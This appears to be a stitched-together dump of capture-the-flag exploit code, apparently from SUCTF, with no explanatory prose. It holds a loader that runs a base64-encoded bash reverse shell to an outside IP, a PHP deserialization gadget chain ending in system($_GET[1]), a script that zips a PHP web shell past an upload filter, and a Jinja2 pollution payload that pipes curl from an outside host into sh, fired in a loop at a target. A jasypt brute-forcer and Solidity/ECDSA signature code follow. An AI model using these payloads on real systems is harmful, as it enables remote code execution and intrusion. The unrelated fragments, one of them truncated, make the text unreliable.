AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwEQAAAAAAAPAQAAAAAAAAAQAAAAAAAAChAAAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAAKwRAAAAAAAAGQAAAAAAAAD4PQAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAAAA+AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAYAIAAAAAAAAFAAAAAAAAAHgDAAAAAAAABgAAAAAAAACIAgAAAAAAAAoAAAAA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"
output_path = os.path.join('/tmp', 'sec1.so')
base64_to_file(encoded_data, output_path)
import importlib.util
import base64

module_path = "/tmp/sec1.so"
module_name = "secure_exec" 

# 加载模块
spec = importlib.util.spec_from_file_location(module_name, module_path)
secure_exec = importlib.util.module_from_spec(spec)
spec.loader.exec_module(secure_exec)

# 使用模块中的函数

secure_exec.execute_command("bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjQuMjIwLjIyOS42MC82MDAwIDA+JjE=}|{base64,-d}|{bash,-i}'")
<?php
namespace ReactPromiseInternal;

use ReactPromisePromiseInterface;
use function ReactPromise_checkTypehint;
use function ReactPromiseresolve;
use function ReactPromiseset_rejection_handler;
use CakeHttpResponse;
class RejectedPromise{
    function set_rejection_handler(?callable $callback)
    {
        static $current = null;
        $previous = $current;
        $current = $callback;

        return $previous;
    }

    public function __construct()
    {

        $this->reason =new Response();
    }
    public function __destruct()
    {
        if ($this->handled) {
            return;
        }

        $handler = static::
set_rejection_handler(null);
        if ($handler === null) {
            $message = 'Unhandled promise rejection with ' . $this->reason;

            error_log($message);
            return;
        }

        try {
            $handler($this->reason);
        } catch (Throwable $e) {
            preg_match('/^([^:s]++)(.*+)$/sm', (string) $e, $match);
            assert(isset($match[1], $match[2]));
            $message = 'Fatal error: Uncaught ' . $match[1] . ' from unhandled promise rejection handler' . $match[2];

            error_log($message);
            exit(255);
        }
    }
}

namespace CakeHttp;

use CakeCoreConfigure;
use CakeHttpCookieCookieCollection;
use CakeHttpCookieCookieInterface;
use CakeHttpExceptionNotFoundException;
use DateTime;
use DateTimeInterface;
use DateTimeZone;
use InvalidArgumentException;
use LaminasDiactorosMessageTrait;
use LaminasDiactorosStream;
use PsrHttpMessageResponseInterface;
use PsrHttpMessageStreamInterface;
use SplFileInfo;
use Stringable;
use function CakeCoreenv;
use function CakeI18n__d;
use CakeORMTable;

class Response {
    public function __construct()
    {
        $this->stream =new Table();
    }
    public function __toString()
    {
        $this->stream->rewind();

        return $this->stream->getContents();
    }
}

namespace CakeORM;
use PHPUnitFrameworkMockObjectGeneratorMockClass;
use ArrayObject;
use BadMethodCallException;
use CakeCollectionCollectionInterface;
use CakeCoreApp;
use CakeCoreConfigure;
use CakeCoreExceptionCakeException;
use CakeDatabaseConnection;
use CakeDatabaseExceptionDatabaseException;
use CakeDatabaseExpressionQueryExpression;
use CakeDatabaseSchemaTableSchemaInterface;
use CakeDatabaseTypeFactory;
use CakeDatasourceConnectionManager;
use CakeDatasourceEntityInterface;
use CakeDatasourceExceptionInvalidPrimaryKeyException;
use CakeDatasourceRepositoryInterface;
use CakeDatasourceRulesAwareTrait;
use CakeEventEventDispatcherInterface;
use CakeEventEventDispatcherTrait;
use CakeEventEventListenerInterface;
use CakeEventEventManager;
use CakeORMAssociationBelongsTo;
use CakeORMAssociationBelongsToMany;
use CakeORMAssociationHasMany;
use CakeORMAssociationHasOne;
use CakeORMExceptionMissingEntityException;
use CakeORMExceptionPersistenceFailedException;
use CakeORMExceptionRolledbackTransactionException;
use CakeORMQueryDeleteQuery;
use CakeORMQueryInsertQuery;
use CakeORMQueryQueryFactory;
use CakeORMQuerySelectQuery;
use CakeORMQueryUpdateQuery;
use CakeORMRuleIsUnique;
use CakeUtilityInflector;
use CakeValidationValidatorAwareInterface;
use CakeValidationValidatorAwareTrait;
use Closure;
use Exception;
use InvalidArgumentException;
use PsrSimpleCacheCacheInterface;
use ReflectionFunction;
use ReflectionNamedType;
use function CakeCoredeprecationWarning;
use function CakeCorenamespaceSplit;
class Table
{

    public function __construct()
    {

        $this->_behaviors = new BehaviorRegistry();
    }

    public function __call(string $method, array $args)
    {

        //method=close arg=null
        var_dump($this->_behaviors);
        if ($this->_behaviors->hasMethod($method)) {
            return $this->_behaviors->call($method, $args);

        }
    }
}
class ObjectRegistry{}
class BehaviorRegistry extends ObjectRegistry{
    public function hasMethod(string $method): bool
    {
        $method = strtolower($method);

        return isset($this->_methodMap[$method]);
    }
    public function has(string $name): bool
    {
        return isset($this->_loaded[$name]);
    }
    public function __construct()
    {
        $this->_methodMap=["rewind"=>array("z","generate")];
        $this->_loaded=["z"=>new MockClass()];
    }

    public function call(string $method, array $args = [])
    {
        //method=close arg=null
        $method = strtolower($method);
        if ($this->hasMethod($method) && $this->has($this->_methodMap[$method][0])) {
            [$behavior, $callMethod] = $this->_methodMap[$method];

            return $this->_loaded[$behavior]->{$callMethod}(...$args);
        }
    }
}

namespace PHPUnitFrameworkMockObjectGenerator;

use function call_user_func;
use function class_exists;
use PHPUnitFrameworkMockObjectConfigurableMethod;
use function SymfonyComponentStrings;

final class MockClass
{
    public function __construct(){
        $this->classCode="system($_GET[1]);";
        $this->mockName="test";
    }
    public function generate()
    {
        if (!class_exists($this->mockName, false)) {
            eval($this->classCode);

            call_user_func(
                [
                    $this->mockName,
                    '__phpunit_initConfigurableMethods',
                ],
                ...$this->configurableMethods,
            );
        }

        return $this->mockName;
    }
}
namespace ReactPromiseInternal;
$a=new RejectedPromise();
echo base64_encode(serialize($a));
<?php
error_reporting(0);

function get_extension($filename){
    return pathinfo($filename, PATHINFO_EXTENSION);
}
function check_extension($filename,$path){
    $filePath = $path . DIRECTORY_SEPARATOR . $filename;
    if (is_file($filePath)) {
        $extension = strtolower(get_extension($filename));

        if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) {
            if (!unlink($filePath)) {
                // echo "Fail to delete file: $filenamen";
                return false;
            }
            else{
                // echo "This file format is not supported:$extensionn";
                return false;
            }
        }
        else{
            return true;
        }
    }
    else{
        // echo "nofile";
        return false;
    }
}
function file_rename ($path,$file){
    $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file);
    $oldPath = $path . DIRECTORY_SEPARATOR . $file;
    $newPath = $path . DIRECTORY_SEPARATOR . $randomName;

    if (!rename($oldPath, $newPath)) {
        unlink($path . DIRECTORY_SEPARATOR . $file);
        // echo "Fail to rename file: $filen";
        return false;
    }
    else{
        return true;
    }
}

function move_file($path,$basePath){
    foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) {
        $destination = $basePath . DIRECTORY_SEPARATOR . basename($file);
        if (!rename($file, $destination)){
            // echo "Fail to rename file: $filen";
            return false;
        }
    }
    return true;
}

function check_base($fileContent){
    $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info'];
    $base64_keywords = [];
    foreach ($keywords as $keyword) {
        $base64_keywords[] = base64_encode($keyword);
    }
    foreach ($base64_keywords as $base64_keyword) {
        if (strpos($fileContent, $base64_keyword)!== false) {
            return true;

        }
        else{
            return false;

        }
    }
}

function check_content($zip){
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (preg_match('/..(/|.|%2e%2e%2f)/i', $fileName)) {
            return false;
        }
        // echo "Checking file: $fileNamen";
        $fileContent = $zip->getFromName($fileName);

        if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) {
            // echo "Don't hack me!n";                return false;
        }
        else {
            continue;
        }
    }
    return true;
}

function unzip($zipname, $basePath) {
    $zip = new ZipArchive;

    if (!file_exists($zipname)) {
        // echo "Zip file does not exist";
        return "zip_not_found";
    }
    if (!$zip->open($zipname)) {
        // echo "Fail to open zip file";
        return "zip_open_failed";
    }
    if (!check_content($zip)) {
        return "malicious_content_detected";
    }
    $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999));
    $path = $basePath . DIRECTORY_SEPARATOR . $randomDir;
    if (!mkdir($path, 0777, true)) {
        // echo "Fail to create directory";
        $zip->close();
        return "mkdir_failed";
    }
    if (!$zip->extractTo($path)) {
        // echo "Fail to extract zip file";
        $zip->close();
    }
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $fileInfo = $zip->statIndex($i);
        $fileName = $fileInfo['name'];
        if (!check_extension($fileName, $path)) {
            // echo "Unsupported file extension";
            continue;
        }
        if (!file_rename($path, $fileName)) {
            // echo "File rename failed";
            continue;
        }
    }
    if (!move_file($path, $basePath)) {
        $zip->close();
        // echo "Fail to move file";
        return "move_failed";
    }
    rmdir($path);
    $zip->close();
    return true;
}

$uploadDir = DIR . DIRECTORY_SEPARATOR . 'upload/suimages/';
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
    $uploadedFile = $_FILES['file'];
    $zipname = $uploadedFile['tmp_name'];
    $path = $uploadDir;

    $result = unzip($zipname, $path);
    if ($result === true) {
        header("Location: index.html?status=success");
        exit();
    } else {
        header("Location: index.html?status=$result");
        exit();
    }
} else {
    header("Location: index.html?status=file_error");
    exit();
}
import zipfile
import io

mf = io.BytesIO()
with zipfile.ZipFile(mf, mode="w", compression=zipfile.ZIP_STORED) as zf:
    zf.writestr('pgyw.php', b'@<?php ("sy"."stem")($_GET[1]);?>')
    zf.writestr('A'*5000, b'AAAAA')

with open("shell.zip", "wb") as f:
    f.write(mf.getvalue())
{"key":"__init__.__globals__.time.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.０","value":"*;import os;os.system('curl http://8.137.112.104/1.sh | sh');#"}
import requests
import time

# 设置目标URL和其他HTTP头信息
url = 'http://27.25.151.48:
10003/Admin?pass=SUers'
headers = {
    'Content-Type': 'application/json',

}

# 请求体中的JSON数据
data = {
    "key": "__init__.__globals__.time.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.０",
    "value": "*;import os;os.system('curl http://8.137.112.104/1.sh |bash');#"
}

# 循环发送请求
def send_requests_loop(interval):
    while True:

            requests.post(url, headers=headers, json=data)
            requests.get(url)
            time.sleep(interval)

if __name__ == '__main__':
    # 开始循环发送请求，间隔时间为1秒
    send_requests_loop(0.3)
package com.example;

import org.jasypt.encryption.pbe.StandardPBEStringEncryptor;
import org.jasypt.encryption.pbe.config.EnvironmentStringPBEConfig;

/**
 * 把密文放到配置文件中的时候要注意：
 * ENC(密文)
 * @author LeeYoung
 */
public class Main {

    private static final String basePassword = "SePassWordLen23SUCTF"; // 基础口令
    private static final String algorithm = "PBEWithMD5AndDES";
    private static final String ciphertext = "ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=";

    public static void main(String[] args) {
        try {
            // 尝试所有可能的三位字符组合
            for (char c1 : getCharacterSet()) {
                for (char c2 : getCharacterSet()) {
                    for (char c3 : getCharacterSet()) {
                        tryCombination(basePassword + c1 + c2 + c3);
                    }
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static char[] getCharacterSet() {
        return "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".toCharArray();
    }

    private static void tryCombination(String password) {
        StandardPBEStringEncryptor encryptor = new StandardPBEStringEncryptor();
        EnvironmentStringPBEConfig config = new EnvironmentStringPBEConfig();
        config.setAlgorithm(algorithm);
        config.setPassword(password);
        encryptor.setConfig(config);

        try {
            String plaintext = encryptor.decrypt(ciphertext);
            System.out.println("Possible password found: " + password);
            System.out.println("Decrypted text: " + plaintext);
            // 如果找到了正确的密码，可以选择在此处退出循环或继续查找其他可能的密码
        } catch (Exception e) {
            // 忽略错误，继续尝试下一个组合
        }
    }
}
pragma solidity 0.8.28;

contract MagicBox {
 struct Signature {
 uint8 v;
 bytes32 r;
 bytes32 s;
 }

 address magician;
 bytes32 alreadyUsedSignatureHash;
 bool isOpened;

 constructor() {}

 function isSolved() public view returns (bool) {
 return isOpened;
 }

 function getMessageHash(address _magician) public view returns (bytes32) {
 return keccak256(abi.encodePacked("I want to open the magic box", _magician, address(this), block.chainid));
 }

 function _getSignerAndSignatureHash(Signature memory _signature) internal view returns (address, bytes32) {
 address signer = ecrecover(getMessageHash(msg.sender), _signature.v, _signature.r, _signature.s);
 bytes32 signatureHash = keccak256(abi.encodePacked(_signature.v, _signature.r, _signature.s));
 return (signer, signatureHash);
 }

 function signIn(Signature memory signature) external {
 require(magician == address(0), "Magician already signed in");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 magician = signer;
 alreadyUsedSignatureHash = signatureHash;
 }

 function openBox(Signature memory signature) external {
 require(magician == msg.sender, "Only magician can open the box");
 (address signer, bytes32 signatureHash) = _getSignerAndSignatureHash(signature);
 require(signer == msg.sender, "Invalid signature");
 require(signatureHash != alreadyUsedSignatureHash, "Signature already used");
 isOpened = true;
 }
}
import libnum
from secp256k1.secp256k1 import *
sk = 0x6072ca68028ec1282998de7ab5e4b7332efdc042f2dd95feb50392fdb6ea5337
Mhash = 0x46055d035781987375fcdba2ac4180c3658fd4e969b4f390bb2ed411084eb4c5
sk = libnum.n2s(sk)
Mhash = libnum.n2s(Mhash)
sign = ecdsa_raw_sign(Mhash, sk)
v, r, s = sign
v = hex(v)
r = hex(r)
s = hex(s)
print(f'{v = }')
print(f'{r = }')
print(f'{s = }')

# 验证签名，失败返回false
tmp = ecdsa_raw_recover(msghash=Mhash, vrs=sign)
print(tmp)
import hashlib, hmac
import sys
if sys.version[0] == '2':
    safe_ord = ord
else:
    safe_ord = lambda x: x

# Elliptic curve parameters (secp256k1)

P = 2**256 - 2**32 - 977
N = 115792089237316195423570985008687907852837564279074904382605163141518161494337
A = 0
B = 7
Gx = 55066263022277343669578718895168534326250603453777594175500187360389116729240
Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
G = (Gx, Gy)

def bytes_to_int(x):
    o = 0
    for b in x:
        o = (o << 8) + safe_ord(b)
    return o

# Extended Euclidean Algorithm
def inv(a, n):
    if a == 0:
        return 0
    lm, hm = 1, 0
    low, high = a % n, n
    while low > 1:
        r = high//low
        nm, new = hm-lm*r, high-low*r
        lm, low, hm, high = nm, new, lm, low
    return lm % n

def to_jacobian(p):
    o = (p[0], p[1], 1)
    return o

def jacobian_double(p):
    if not p[1]:
        return (0, 0, 0)
    ysq = (p[1] ** 2) % P
    S = (4 * p[0] * ysq) % P
    M = (3 * p[0] ** 2 + A * p[2] ** 4) % P
    nx = (M**2 - 2 * S) % P
    ny = (M * (S - nx) - 8 * ysq ** 2) % P
    nz = (2 * p[1] * p[2]) % P
    return (nx, ny, nz)

def jacobian_add(p, q):
    if not p[1]:
        return q
    if not q[1]:
        return p
    U1 = (p[0] * q[2] ** 2) % P
    U2 = (q[0] * p[2] ** 2) % P
    S1 = (p[1] * q[2] ** 3) % P
    S2 = (q[1] * p[2] ** 3) % P
    if U1 == U2:
        if S1 != S2:
            return (0, 0, 1)
        return jacobian_double(p)
    H = U2 - U1
    R = S2 - S1
    H2 = (H * H) % P
    H3 = (H * H2) % P
    U1H2 = (U1 * H2) % P
    nx = (R ** 2 - H3 - 2 * U1H2) % P
    ny = (R * (U1H2 - nx) - S1 * H3) % P
    nz = (H * p[2] * q[2]) % P
    return (nx, ny, nz)

def from_jacobian(p):
    z = inv(p[2], P)
    return ((p[0] * z**2) % P, (p[1] * z**3) % P)

def jacobian_multiply(a, n):
    if a[1] == 0 or n == 0:
        return (0, 0, 1)
    if n == 1:
        return a
    if n < 0 or n >= N:
        return jacobian_multiply(a, n % N)
    if (n % 2) == 0:
        return jacobian_double(jacobian_multiply(a, n//2))
    if (n % 2) == 1:
        return jacobian_add(jacobian_double(jacobian_multiply(a, n//2)), a)

def multiply(a, n):
    return from_jacobian(jacobian_multiply(to_jacobian(a), n))

def add(a, b):
    return from_jacobian(jacobian_add(to_jacobian(a), to_jacobian(b)))

def privtopub(privkey):
    return multiply(G, bytes_to_int(privkey))

def deterministic_generate_k(msghash, priv):
    # v = b'x01' * 32
    # k = b'x00' * 32
    v = b'x12' * 32
    k = b'x23' * 32
    k = hmac.new(k, v+b'x00'+priv+msghash, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    k = hmac.new(k, v+b'x01'+priv+msghash, hashlib.sha256).digest()
    v = hmac.new(k, v, hashlib.sha256).digest()
    return bytes_to_int(hmac.new(k, v, hashlib.sha256).digest())

# bytes32, bytes32 -> v, r, s (as numbers)
def ecdsa_raw_sign(msghash, priv):

    z = bytes_to_int(msghash)
    k = deterministic_generate_k(msghash, priv)

    r, y = multiply(G, k)
    s = inv(k, N) * (z + r*bytes_to_int(priv)) % N

    v, r, s = 27+((y % 2) ^ (0 if s * 2 < N else 1)), r, s if s * 2 < N else N - s
    return v, r, s

def ecdsa_raw_recover(msghash, vrs):
    v, r, s = vrs
    if not (27 <= v <= 34):
        raise ValueError("%d must in range 27-31" % v)
    x = r
    xcubedaxb = (x*x*x+A*x+B) % P
    beta = pow(xcubedaxb, (P+1)//4, P)
    y = beta if v % 2 ^ beta % 2 else (P - beta)
    # If xcubedaxb is not a quadratic residue, then r cannot be the x coord
    # for a point on the curve, and so the sig is invalid
    if (xcubedaxb - y*y) % P != 0 or not (r % N) or not (s % N):
        return False
    z = bytes_to_int(msghash)
